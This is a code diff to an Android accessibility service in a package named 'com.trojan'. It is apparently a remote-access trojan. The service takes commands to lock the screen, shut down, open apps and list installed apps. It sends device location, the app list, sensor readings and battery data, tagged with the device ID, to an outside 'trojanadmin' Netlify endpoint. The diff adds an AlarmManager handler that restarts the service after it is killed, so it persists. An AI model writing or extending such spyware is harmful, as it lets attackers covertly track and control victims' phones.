@@ -2,6 +2,8 @@ package com.trojan;
 
 import android.accessibilityservice.AccessibilityService;
 import android.annotation.SuppressLint;
+import android.app.AlarmManager;
+import android.app.PendingIntent;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
@@ -15,6 +17,7 @@ import android.hardware.SensorManager;
 import android.location.Location;
 import android.os.BatteryManager;
 import android.os.PowerManager;
+import android.os.SystemClock;
 import android.provider.Settings;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
@@ -33,10 +36,8 @@ import java.util.List;
 
 public class PowerAccessibilityService extends AccessibilityService implements SensorEventListener {
 
-    // Use a consistent log tag
     private static final String TAG = "PowerAccessibility";
 
-    // Action strings for commands (no changes needed)
     public static final String ACTION_TRIGGER_LOCK_SCREEN = "com.trojan.ACTION_LOCK_SCREEN";
     public static final String ACTION_TRIGGER_SHUTDOWN = "com.trojan.ACTION_SHUTDOWN";
     public static final String ACTION_TRIGGER_LIST_APPS = "com.trojan.ACTION_LIST_APPS";
@@ -54,7 +55,6 @@ public class PowerAccessibilityService extends AccessibilityService implements S
     public static final String ACTION_TRIGGER_GET_SCREEN_STATUS = "com.trojan.ACTION_GET_SCREEN_STATUS";
     public static final String ACTION_TRIGGER_GET_BATTERY_STATUS = "com.trojan.ACTION_GET_BATTERY_STATUS";
 
-    // URL to the backend function that receives data from the device
     private static final String SUBMIT_DATA_URL = "https://trojanadmin.netlify.app/.netlify/functions/submit-data";
 
     private PowerActionReceiver powerActionReceiver;
@@ -75,7 +75,7 @@ public class PowerAccessibilityService extends AccessibilityService implements S
 
         powerActionReceiver = new PowerActionReceiver();
         IntentFilter filter = new IntentFilter();
-        // Add all actions to the filter
+        
         filter.addAction(ACTION_TRIGGER_LOCK_SCREEN); filter.addAction(ACTION_TRIGGER_SHUTDOWN);
         filter.addAction(ACTION_TRIGGER_LIST_APPS); filter.addAction(ACTION_TRIGGER_GET_CURRENT_APP);
         filter.addAction(ACTION_TRIGGER_OPEN_APP); filter.addAction(ACTION_TRIGGER_NAV_BACK);
@@ -85,7 +85,6 @@ public class PowerAccessibilityService extends AccessibilityService implements S
         filter.addAction(ACTION_TRIGGER_GET_LOCATION); filter.addAction(ACTION_TRIGGER_GET_SENSORS);
         filter.addAction(ACTION_TRIGGER_GET_SCREEN_STATUS); filter.addAction(ACTION_TRIGGER_GET_BATTERY_STATUS);
         
-        // Using RECEIVER_NOT_EXPORTED is correct and secure
         registerReceiver(powerActionReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
         Log.d(TAG, "PowerActionReceiver registered for all actions.");
     }
@@ -121,15 +120,12 @@ public class PowerAccessibilityService extends AccessibilityService implements S
         }
     }
     
-    // --- UPDATED to fix data format ---
     private void getAndUploadAppList() {
         try {
             PackageManager pm = getPackageManager();
             List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
-            // The frontend parser expects a JSONObject (map), not a JSONArray.
             JSONObject appMap = new JSONObject();
             for (ApplicationInfo app : apps) {
-                // Filter out system apps
                 if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                     appMap.put(app.packageName, app.loadLabel(pm).toString());
                 }
@@ -141,13 +137,7 @@ public class PowerAccessibilityService extends AccessibilityService implements S
         }
     }
     
-    // --- UPDATED with more robust error handling and comments ---
     private void getCurrentLocation() {
-        // --- CRITICAL NOTE ---
-        // This function will FAIL if the user has not MANUALLY granted the
-        // "Location" permission to this app in their phone's settings.
-        // You must also add <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-        // to your AndroidManifest.xml file.
         try {
             fusedLocationClient.getLastLocation().addOnSuccessListener(location -> {
                 try {
@@ -157,7 +147,6 @@ public class PowerAccessibilityService extends AccessibilityService implements S
                         locJson.put("longitude", location.getLongitude());
                         submitDataToServer("location", locJson);
                     } else {
-                        // This can happen if location is turned off or has never been polled.
                         Log.w(TAG, "FusedLocationProvider returned null. Location might be off.");
                         submitDataToServer("location", "Not available");
                     }
@@ -171,8 +160,6 @@ public class PowerAccessibilityService extends AccessibilityService implements S
             submitDataToServer("location", "Permission Denied");
         }
     }
-
-    // --- All other methods remain largely the same, as they were well-structured ---
     
     private void getSensorData() {
         Sensor accelerometer = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
@@ -247,8 +234,6 @@ public class PowerAccessibilityService extends AccessibilityService implements S
     }
 
     private void submitDataToServer(String dataType, Object payload) {
-        // This function is the single point of contact with your backend.
-        // If data doesn't appear, check the logs in your "submit-data" Netlify function.
         JSONObject postData = new JSONObject();
         try {
             String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
@@ -268,7 +253,6 @@ public class PowerAccessibilityService extends AccessibilityService implements S
         requestQueue.add(request);
     }
     
-    // --- Other utility methods (unchanged) ---
     private void getBatteryStatus() {
         IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
         Intent batteryStatus = registerReceiver(null, filter);
@@ -335,5 +319,29 @@ public class PowerAccessibilityService extends AccessibilityService implements S
         sensorManager.unregisterListener(this);
         Log.i(TAG, "Accessibility Service Unbound.");
         return super.onUnbind(intent);
+    }
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        Log.i(TAG, "Task removed. Attempting to restart service in 1 second.");
+        
+        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
+        restartServiceIntent.setPackage(getPackageName());
+
+        PendingIntent restartServicePendingIntent = PendingIntent.getService(
+            getApplicationContext(), 
+            1, 
+            restartServiceIntent, 
+            PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
+        );
+
+        AlarmManager alarmService = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
+        alarmService.set(
+            AlarmManager.ELAPSED_REALTIME,
+            SystemClock.elapsedRealtime() + 1000,
+            restartServicePendingIntent
+        );
+
+        super.onTaskRemoved(rootIntent);
     }
 }
